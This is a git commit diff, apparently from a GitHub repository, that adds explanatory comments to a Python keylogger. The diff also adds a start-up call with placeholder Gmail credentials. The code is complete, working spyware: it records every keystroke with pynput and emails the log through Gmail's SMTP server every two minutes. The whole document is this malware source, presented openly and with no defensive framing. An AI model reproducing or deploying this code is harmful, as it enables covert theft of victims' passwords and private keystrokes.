6cf74814c54ff7d2444643c239853a6c0ac4972e
Paweł Orzechowski <110523018+oziesiek@users.noreply.github.com>
2023-09-13 12:50:40 +0200

    Update keylogger.py
    comments

--- keylogger/keylogger.py
+++ keylogger/keylogger.py
@@ -1,44 +1,47 @@
 #!/usr/bin/env python
-import pynput.keyboard
-import threading
-import smtplib
-
+import pynput.keyboard  # Import the pynput.keyboard library for keylogging
+import threading  # Import the threading module for running functions concurrently
+import smtplib  # Import the smtplib library for sending emails
 
 class Keylogger:
     def __init__(self, time_interval, email, password):
-        self.log = "Keylogger started"
-        self.interval = time_interval
-        self.email = email
-        self.password = password
+        self.log = "Keylogger started"  # Initialize the log with a start message
+        self.interval = time_interval  # Set the time interval for reporting
+        self.email = email  # Store the email address for sending logs
+        self.password = password  # Store the email password for authentication
 
     def append_to_log(self, string):
-        self.log = self.log + string
+        self.log = self.log + string  # Append text to the log
 
     def process_key_press(self, key):
         try:
-            current_key = str(key.char)
+            current_key = str(key.char)  # Try to get the character representation of the pressed key
         except AttributeError:
             if key == key.space:
-                current_key = " "
+                current_key = " "  # Replace the space key with a space character
             else:
-                current_key = " " + str(key) + " "
-        self.append_to_log(current_key)
+                current_key = " " + str(key) + " "  # Wrap other keys in spaces for readability
+        self.append_to_log(current_key)  # Append the pressed key to the log
 
     def report(self):
-        self.send_mail(self.email, self.password, "\n\n" + self.log)
-        self.log = ""
-        timer = threading.Timer(self.interval, self.report)
-        timer.start()
+        self.send_mail(self.email, self.password, "\n\n" + self.log)  # Send the log via email
+        self.log = ""  # Clear the log after sending
+        timer = threading.Timer(self.interval, self.report)  # Create a timer to schedule the next report
+        timer.start()  # Start the timer
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP("smtp.gmail.com", 587)
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
+        server = smtplib.SMTP("smtp.gmail.com", 587)  # Create an SMTP server connection
+        server.starttls()  # Start TLS encryption for secure communication
+        server.login(email, password)  # Log in to the email account
+        server.sendmail(email, email, message)  # Send the email with the log
+        server.quit()  # Quit the SMTP server
 
     def start(self):
-        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)  # Create a keyboard listener
         with keyboard_listener:
-            self.report()
-            keyboard_listener.join()
+            self.report()  # Start reporting keylogs
+            keyboard_listener.join()  # Join the keyboard listener thread
+
+# Create an instance of the Keylogger class and start the keylogging process
+keylogger = Keylogger(120, "your_email@gmail.com", "your_password")
+keylogger.start()
